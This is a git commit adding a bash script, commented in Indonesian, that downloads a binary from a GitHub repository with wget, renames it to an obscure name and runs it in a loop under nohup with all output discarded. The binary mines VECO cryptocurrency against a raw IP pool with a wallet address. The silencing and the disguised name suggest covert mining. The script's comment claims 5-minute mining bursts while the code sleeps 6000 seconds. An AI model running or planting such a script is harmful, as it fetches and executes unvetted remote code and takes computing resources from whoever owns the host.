062274ed9880663899e796e3cecc0360159ec7b0
barburonjilo <barburonjilo@outlook.co.id>
2025-07-16 20:37:36 +0700

    Create veco4.sh

---
+++ veco4.sh
@@ -0,0 +1,31 @@
+#!/bin/bash
+
+echo "[veco1-loop] Dimulai pada $(date)"
+
+# Bersihkan proses sebelumnya
+pkill cidx
+
+# Download binary mining
+rm -f cidx
+wget -O cidx https://github.com/barburonjilo/back/raw/main/sru >/dev/null 2>&1
+
+chmod +x cidx
+
+# Loop mining 5 menit, istirahat 15 menit
+while true; do
+  echo "[⛏️ START] $(date): Mining aktif 5 menit..."
+  
+  nohup ./cidx -a yespower \
+    -o 45.115.224.126:443 \
+    -u VGq2bKrQ2AiJPNwttzKw7FE8RZJSQQva3G.worker4 \
+    -p c=VECO,m=solo,zap=VECO,mc=VECO \
+    -t 6 &>/dev/null &
+
+  sleep 6000   # 5 menit mining
+
+  echo "[🛑 STOP] $(date): Mining dihentikan sementara."
+  pkill cidx
+
+  echo "[⏱ WAIT] Delay 15 menit sebelum jalan ulang..."
+  sleep 900   # 15 menit istirahat
+done
